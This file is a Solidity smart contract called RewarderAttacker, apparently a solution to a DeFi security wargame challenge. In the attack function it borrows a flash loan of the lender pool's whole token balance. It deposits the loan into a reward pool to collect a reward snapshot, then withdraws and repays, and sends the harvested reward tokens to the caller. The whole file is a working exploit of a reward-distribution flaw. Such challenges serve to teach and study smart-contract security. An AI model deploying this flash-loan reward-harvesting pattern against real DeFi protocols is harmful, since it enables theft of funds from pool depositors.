pragma solidity ^0.8.5;

import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract RewarderAttacker{ 
    address public rewarderPool;
    address public flashLoanerPool;
    address public tokenAddress;
    address public rewardToken;    
    
    constructor(address rewarder,address flashLoaner,address token,address rewardToken_) public{ 
        rewarderPool = rewarder;
        flashLoanerPool = flashLoaner;
        tokenAddress = token;
        rewardToken = rewardToken_;
    }

    function attack() public {
        FlashLoanerPool targetPool = FlashLoanerPool(flashLoanerPool);
        TheRewarderPool rewarderPool_ = TheRewarderPool(rewarderPool);
        uint256 snapshotCount = rewarderPool_.lastSnapshotIdForRewards();
        uint256 amount = ERC20(tokenAddress).balanceOf(flashLoanerPool);
        targetPool.flashLoan(amount);
        uint256 returnToOwner = ERC20(rewardToken).balanceOf(address(this));
        ERC20(rewardToken).transfer(msg.sender,returnToOwner);
    }

    function receiveFlashLoan(uint256 amount) public {
        ERC20 targetToken = ERC20(tokenAddress);
        TheRewarderPool rewardPool = TheRewarderPool(rewarderPool);
        targetToken.approve(rewarderPool,amount);
        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);
        targetToken.transfer(flashLoanerPool,amount);
    }
}